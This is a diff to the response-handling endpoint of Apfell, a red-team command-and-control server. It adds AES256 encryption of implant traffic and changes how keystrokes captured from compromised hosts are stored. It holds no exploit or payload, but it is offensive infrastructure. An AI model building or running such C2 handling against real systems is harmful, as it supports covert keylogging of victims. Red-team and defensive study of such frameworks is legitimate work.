@@ -1,11 +1,12 @@
 from app import apfell, db_objects
-from sanic.response import json
+from sanic.response import json, raw
 from app.database_models.model import Task, Response, Operation, Callback, Keylog, TaskArtifact, Artifact, ArtifactTemplate
 import base64
 from sanic_jwt.decorators import protected, inject_user
 from app.api.file_api import create_filemeta_in_database_func, download_file_to_disk_func
 import json as js
 import datetime
+import app.crypto as crypt
 
 
 # This gets all responses in the database
@@ -76,13 +77,6 @@ async def search_responses(request, user):
 # We don't add @protected or @injected_user here because the callback needs to be able to post here for responses
 @apfell.route(apfell.config['API_BASE'] + "/responses/<id:int>", methods=['POST'])
 async def update_task_for_callback(request, id):
-    data = request.json
-    if 'response' not in data:
-        return json({'status': 'error', 'error': 'task response not in data'})
-    try:
-        decoded = base64.b64decode(data['response']).decode('utf-8')
-    except Exception as e:
-        return json({'status': 'error', 'error': 'failed to decode response'})
     try:
         task = await db_objects.get(Task, id=id)
         callback = await db_objects.get(Callback, id=task.callback.id)
@@ -93,6 +87,20 @@ async def update_task_for_callback(request, id):
     except Exception as e:
         return json({'status': 'error',
                      'error': 'Task does not exist or callback does not exist'})
+    if callback.encryption_type != "null" and callback.encryption_type is not None:
+        if callback.encryption_type == "AES256":
+            # now handle the decryption
+            decrypted_message = await crypt.decrypt_AES256(data=base64.b64decode(request.body),
+                                                           key=base64.b64decode(callback.decryption_key))
+            data = js.loads(decrypted_message.decode('utf-8'))
+    else:
+        data = request.json
+    if 'response' not in data:
+        return json({'status': 'error', 'error': 'task response not in data'})
+    try:
+        decoded = base64.b64decode(data['response']).decode('utf-8')
+    except Exception as e:
+        return json({'status': 'error', 'error': 'failed to decode response'})
     resp = None  # declare the variable now so we can tell if we already created a response later
     json_return_info = {'status': 'success'}
     final_output = decoded
@@ -136,14 +144,15 @@ async def update_task_for_callback(request, id):
             if task.command.cmd == 'keylog':
                 if "window_title" not in parsed_response or parsed_response['window_title'] is None:
                     parsed_response['window_title'] = "UNKNOWN"
-                if "keystrokes" not in parsed_response or parsed_response['keystrokes'] is None:
-                    return json({'status': 'error', 'error': 'keylogging response has no keystrokes'})
                 if "user" not in parsed_response or parsed_response['user'] is None:
                     parsed_response['user'] = "UNKONWN"
-                resp = await db_objects.create(Keylog, task=task, window=parsed_response['window_title'],
-                                               keystrokes=parsed_response['keystrokes'], operation=callback.operation,
-                                               user=parsed_response['user'])
-                json_return_info = {**json_return_info, 'status': 'success'}
+                if "keystrokes" not in parsed_response or parsed_response['keystrokes'] is None:
+                    json_return_info = {'status': 'error', 'error': 'keylogging response has no keystrokes'}
+                else:
+                    resp = await db_objects.create(Keylog, task=task, window=parsed_response['window_title'],
+                                                   keystrokes=parsed_response['keystrokes'], operation=callback.operation,
+                                                   user=parsed_response['user'])
+                    json_return_info = {**json_return_info, 'status': 'success'}
             if 'artifacts' in parsed_response:
                 # now handle the case where the agent is reporting back artifact information
                 for artifact in parsed_response['artifacts']:
@@ -172,4 +181,13 @@ async def update_task_for_callback(request, id):
         resp = await db_objects.create(Response, task=task, response=final_output)
         task.status = "processed"
         await db_objects.update(task)
-    return json(json_return_info)
+    # handle the final reply back if it needs to be encrypted or not
+    if callback.encryption_type != "" and callback.encryption_type is not None:
+        # encrypt the message before returning it
+        string_message = js.dumps(json_return_info)
+        if callback.encryption_type == "AES256":
+            raw_encrypted = await crypt.encrypt_AES256(data=string_message.encode(),
+                                                       key=base64.b64decode(callback.encryption_key))
+            return raw(base64.b64encode(raw_encrypted), status=200)
+    else:
+        return json(json_return_info)
